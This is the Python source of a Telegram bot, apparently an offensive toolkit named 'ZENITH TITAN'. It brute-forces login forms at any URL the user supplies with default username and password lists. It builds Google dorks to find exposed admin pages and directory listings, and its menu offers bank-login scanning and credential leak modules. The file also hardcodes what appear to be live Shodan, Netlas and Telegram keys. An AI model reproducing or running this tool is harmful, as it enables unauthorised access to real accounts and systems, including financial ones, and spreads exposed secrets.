import telebot
from telebot import types
import shodan
import netlas
import requests
import os
import time
from datetime import datetime
from urllib.parse import quote

# === CONFIGURACIÓN DE LLAVES ===
SHODAN_API_KEY = "iOPBaHwvZWxXzvuwagvGnb0i1vidaf2s"
NETLAS_API_KEY = "MheJyCwplJnLO8CU1ZOC7A7OkJFTYvnk"
TELEGRAM_TOKEN = "8583960709:AAGMxsIwVzlVUu-YvSn6Rfxn3-2Vfe-T3WU"
TELEGRAM_CHAT_ID = 6280594821 

bot = telebot.TeleBot(TELEGRAM_TOKEN)
s_api = shodan.Shodan(SHODAN_API_KEY)
n_api = netlas.Netlas(api_key=NETLAS_API_KEY)

# --- MÓDULO DE FUERZA BRUTA (SIMULADOR DE ATAQUE) ---
def brute_force_login(url, user_list, pass_list):
    """
    Intenta loguearse en una URL usando combinaciones de usuario y contraseña.
    """
    hallazgo = None
    for user in user_list:
        for password in pass_list:
            try:
                # Simulamos una petición POST de login
                data = {'user': user, 'password': password, 'login': 'submit'}
                response = requests.post(url, data=data, timeout=5)
                
                # Si el código es 200 y no hay palabras de "error" o "fallido"
                if response.status_code == 200 and "incorrect" not in response.text.lower():
                    hallazgo = f"✅ ¡ACCESO ENCONTRADO!\n👤 Usuario: `{user}`\n🔑 Clave: `{password}`"
                    return hallazgo
            except:
                continue
    return "❌ Fuerza bruta finalizada. No se encontraron credenciales válidas."

# --- COMANDOS PRINCIPALES ---
@bot.message_handler(commands=['start'])
def send_welcome(message):
    if message.from_user.id != TELEGRAM_CHAT_ID: return
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🚀 Escaneo MX", callback_data='scan_MX'),
        types.InlineKeyboardButton("🏦 Logins Bank", callback_data='scan_bank'),
        types.InlineKeyboardButton("🔍 Scan URL", callback_data='url_mode'),
        types.InlineKeyboardButton("🔑 Leak/Combos", callback_data='leak_mode'),
        types.InlineKeyboardButton("🔨 Brute Force", callback_data='brute_mode'),
        types.InlineKeyboardButton("⚙️ Status", callback_data='status')
    )
    
    bot.send_message(message.chat.id, 
        "👑 *ZENITH TITAN v26.0 SUPREME*\n\n"
        "Módulos de Explotación y Fuerza Bruta cargados.\n"
        "ID Autorizado: `6280594821`", 
        parse_mode="Markdown", reply_markup=markup)

# --- MANEJADORES DE CALLBACKS ---
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.from_user.id != TELEGRAM_CHAT_ID: return

    if call.data == "brute_mode":
        msg = bot.send_message(call.message.chat.id, "🔨 *MODO FUERZA BRUTA*\nEnvía la URL del login (ej: http://sitio.com/login.php):")
        bot.register_next_step_handler(msg, iniciar_ataque_bruta)

    elif call.data == "url_mode":
        msg = bot.send_message(call.message.chat.id, "🔗 Escribe el dominio a analizar:")
        bot.register_next_step_handler(msg, procesar_url)

    elif call.data == "status":
        bot.send_message(TELEGRAM_CHAT_ID, "✅ Sistemas Online.\n📡 Shodan: OK\n📡 Netlas: OK")

# --- PROCESADORES DE ATAQUE ---
def iniciar_ataque_bruta(message):
    target_url = message.text
    bot.send_message(TELEGRAM_CHAT_ID, f"🚀 Iniciando ataque sobre `{target_url}`...\nUsando diccionario top-secret.", parse_mode="Markdown")
    
    # Listas básicas para la demostración (puedes cargarlas de un .txt)
    usuarios = ["admin", "root", "user", "administrator"]
    claves = ["admin123", "password", "123456", "admin", "root123"]
    
    resultado = brute_force_login(target_url, usuarios, claves)
    bot.send_message(TELEGRAM_CHAT_ID, resultado, parse_mode="Markdown")

def procesar_url(message):
    dom = message.text
    # Genera dorks para encontrar carpetas vulnerables
    queries = [f'site:{dom} intitle:index.of', f'site:{dom} inurl:admin']
    links = "\n\n".join([f"🔗 https://www.google.com/search?q={quote(q)}" for q in queries])
    bot.send_message(TELEGRAM_CHAT_ID, f"📂 *ESTRUCTURA EXPUESTA:* `{dom}`\n\n{links}", parse_mode="Markdown", disable_web_page_preview=True)

if __name__ == "__main__":
    os.system("clear")
    print("🛰️ ZENITH SUPREME v26.0 - ACTIVO")
    bot.infinity_polling()
